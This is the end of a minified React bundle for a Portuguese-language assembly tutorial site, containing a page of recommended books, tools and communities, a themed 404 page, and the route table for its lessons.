(AArch64)"}),r.jsx("br",{}),r.jsx("small",{children:"developer.arm.com — documentação oficial ARM"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:"RISC-V ISA Specification"}),r.jsx("br",{}),r.jsx("small",{children:"riscv.org/technical/specifications — especificação aberta do RISC-V"})]})]}),r.jsx("h2",{children:"Livros Recomendados"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:'"Programming from the Ground Up"'})," — Jonathan Bartlett",r.jsx("br",{}),r.jsx("small",{children:"Gratuito online. Introdução sólida em x86 Linux."})]}),r.jsxs("li",{children:[r.jsx("strong",{children:'"The Art of Assembly Language"'})," — Randall Hyde",r.jsx("br",{}),r.jsx("small",{children:"Referência clássica, disponível em nostarch.com"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:`"Computer Systems: A Programmer's Perspective"`})," — Bryant & O'Hallaron",r.jsx("br",{}),r.jsx("small",{children:"CS:APP — o melhor livro para entender Assembly no contexto de sistemas"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:'"Modern X86 Assembly Language Programming"'})," — Daniel Kusswurm",r.jsx("br",{}),r.jsx("small",{children:"Foca em SSE/AVX e otimização moderna"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:'"Hacking: The Art of Exploitation"'})," — Jon Erickson",r.jsx("br",{}),r.jsx("small",{children:"Assembly para segurança e exploração"})]})]}),r.jsx("h2",{children:"Ferramentas Online"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Compiler Explorer (godbolt.org)"})," — Veja o Assembly gerado por C/C++/Rust em tempo real"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"defuse.ca/online-x86-assembler"})," — Assemblar e disassemblar online"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"syscalls.mebeim.net"})," — Tabela de syscalls Linux por arquitetura e versão do kernel"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"uops.info"})," — Latência e throughput de cada instrução x86 por microarquitetura"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Shell-storm.org"})," — Shellcodes e recursos de segurança"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"NASM Playground (nasm.io)"})," — Editor e compilador NASM online"]})]}),r.jsx("h2",{children:"Cursos e Exercícios"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"crackmes.one"})," — Desafios de engenharia reversa para praticar"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"CTF competitions"})," — picoCTF, pwn.college, pwnable.kr, exploit.education"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"pwn.college"})," — Curso gratuito de segurança com foco em Assembly"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"CS:APP Labs"})," — Lab de bomb, bufbomb, shelllab do livro CS:APP"]})]}),r.jsx("h2",{children:"Comunidades"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Reddit r/asm"})," — Comunidade de Assembly"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Reddit r/ReverseEngineering"})," — Engenharia reversa"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Stack Overflow [assembly]"})," — Perguntas e respostas"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Freenode #assembly"})," — IRC da comunidade"]})]}),r.jsx(T,{type:"success",title:"Continue Praticando!",children:"A melhor forma de aprender Assembly é escrevendo código. Comece com programas simples, depois analise binários existentes com GDB/radare2. Cada dia de prática traz novas descobertas sobre como o computador realmente funciona."})]})}function Q1(){return r.jsx("div",{className:"flex-1 flex items-center justify-center min-h-screen bg-background text-foreground",children:r.jsxs(di.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.5},className:"text-center px-6",children:[r.jsx("div",{className:"text-8xl font-mono font-black text-primary mb-4",children:"404"}),r.jsx("div",{className:"font-mono text-2xl text-muted-foreground mb-2",children:"; Erro: página não encontrada"}),r.jsx("pre",{className:"font-mono text-sm text-muted-foreground/70 bg-muted/30 rounded-lg p-4 mb-8 inline-block text-left",children:`cmp rax, 0x404     ; verificar status
je  .nao_encontrado ; página não existe
; ...

.nao_encontrado:
    lea rdi, [rel msg_404]
    call render_error
    ; retornar para home`}),r.jsx("div",{className:"text-muted-foreground mb-8",children:"A página que você procura não foi encontrada no mapa de memória."}),r.jsxs(La,{href:"/",className:"inline-flex items-center gap-2 bg-primary text-primary-foreground px-6 py-3 rounded-lg font-mono font-medium hover:bg-primary/90 transition-colors",children:[r.jsx("span",{children:"JMP _start"}),r.jsx("span",{children:"→"})]})]})})}const Y1=new q0;function K1({children:i}){const[l,u]=se.useState(!1),[m]=gi();return se.useEffect(()=>{u(!1),window.scrollTo(0,0)},[m]),r.jsxs("div",{className:"min-h-screen bg-background text-foreground flex",children:[r.jsx(fg,{isOpen:l,setIsOpen:u}),r.jsxs("div",{className:"flex-1 lg:pl-72 flex flex-col min-w-0 transition-all duration-300",children:[r.jsx(gg,{onMenuClick:()=>u(!0)}),r.jsx("main",{className:"flex-1",children:i})]})]})}function W1(){return r.jsx(K1,{children:r.jsxs(r0,{children:[r.jsx(q,{path:"/",component:yg}),r.jsx(q,{path:"/introducao",component:Eg}),r.jsx(q,{path:"/historia",component:Cg}),r.jsx(q,{path:"/por-que-aprender",component:_g}),r.jsx(q,{path:"/arquiteturas",component:Mg}),r.jsx(q,{path:"/sistemas-numericos",component:Og}),r.jsx(q,{path:"/representacao-dados",component:Dg}),r.jsx(q,{path:"/registradores",component:Tg}),r.jsx(q,{path:"/memoria",component:qg}),r.jsx(q,{path:"/flags",component:Ng}),r.jsx(q,{path:"/instalacao-nasm",component:Lg}),r.jsx(q,{path:"/instalacao-gas",component:zg}),r.jsx(q,{path:"/hello-world",component:wg}),r.jsx(q,{path:"/gdb",component:Xg}),r.jsx(q,{path:"/objdump",component:Bg}),r.jsx(q,{path:"/strace",component:Pg}),r.jsx(q,{path:"/instrucoes-movimento",component:Ug}),r.jsx(q,{path:"/aritmetica",component:Ig}),r.jsx(q,{path:"/logica",component:kg}),r.jsx(q,{path:"/saltos",component:Fg}),r.jsx(q,{path:"/shifts",component:Gg}),r.jsx(q,{path:"/controle-fluxo",component:Vg}),r.jsx(q,{path:"/loops",component:Hg}),r.jsx(q,{path:"/recursao",component:Zg}),r.jsx(q,{path:"/funcoes-stack",component:Qg}),r.jsx(q,{path:"/calling-conventions",component:Yg}),r.jsx(q,{path:"/stack-frame",component:Kg}),r.jsx(q,{path:"/varargs",component:Wg}),r.jsx(q,{path:"/segmentos",component:Jg}),r.jsx(q,{path:"/ponteiros",component:$g}),r.jsx(q,{path:"/strings-arrays",component:e1}),r.jsx(q,{path:"/estruturas",component:a1}),r.jsx(q,{path:"/syscalls-linux",component:r1}),r.jsx(q,{path:"/syscalls-windows",component:t1}),r.jsx(q,{path:"/io-processos",component:s1}),r.jsx(q,{path:"/modo-real",component:o1}),r.jsx(q,{path:"/modo-protegido",component:i1}),r.jsx(q,{path:"/long-mode",component:n1}),r.jsx(q,{path:"/simd",component:l1}),r.jsx(q,{path:"/sse",component:c1}),r.jsx(q,{path:"/avx",component:d1}),r.jsx(q,{path:"/fpu",component:m1}),r.jsx(q,{path:"/inline-assembly",component:u1}),r.jsx(q,{path:"/linking-c",component:x1}),r.jsx(q,{path:"/exportar-funcoes",component:p1}),r.jsx(q,{path:"/abi",component:h1}),r.jsx(q,{path:"/pipeline",component:f1}),r.jsx(q,{path:"/cache",component:b1}),r.jsx(q,{path:"/branch-prediction",component:g1}),r.jsx(q,{path:"/otimizacao",component:v1}),r.jsx(q,{path:"/gdb-avancado",component:j1}),r.jsx(q,{path:"/analise-binarios",component:y1}),r.jsx(q,{path:"/eng-reversa",component:S1}),r.jsx(q,{path:"/arm-introducao",component:A1}),r.jsx(q,{path:"/arm-registradores",component:R1}),r.jsx(q,{path:"/arm-instrucoes",component:E1}),r.jsx(q,{path:"/arm-thumb",component:C1}),r.jsx(q,{path:"/raspberry-pi",component:_1}),r.jsx(q,{path:"/riscv-introducao",component:M1}),r.jsx(q,{path:"/riscv-registradores",component:O1}),r.jsx(q,{path:"/riscv-instrucoes",component:D1}),r.jsx(q,{path:"/masm",component:T1}),r.jsx(q,{path:"/win32-api",component:q1}),r.jsx(q,{path:"/win64-abi",component:N1}),r.jsx(q,{path:"/buffer-overflow",component:L1}),r.jsx(q,{path:"/shellcoding",component:z1}),r.jsx(q,{path:"/rop",component:w1}),r.jsx(q,{path:"/macros",component:X1}),r.jsx(q,{path:"/diretivas",component:B1}),r.jsx(q,{path:"/preprocessamento",component:P1}),r.jsx(q,{path:"/projeto-printf",component:U1}),r.jsx(q,{path:"/projeto-malloc",component:I1}),r.jsx(q,{path:"/projeto-sort",component:k1}),r.jsx(q,{path:"/bootloader",component:F1}),r.jsx(q,{path:"/kernel-minimo",component:G1}),r.jsx(q,{path:"/aes-assembly",component:V1}),r.jsx(q,{path:"/sha256-assembly",component:H1}),r.jsx(q,{path:"/referencias",component:Z1}),r.jsx(q,{component:Q1})]})})}function J1(){return r.jsx(L0,{client:Y1,children:r.jsx(Dx,{hook:gi,children:r.jsx(W1,{})})})}wf.createRoot(document.getElementById("root")).render(r.jsx(J1,{}));
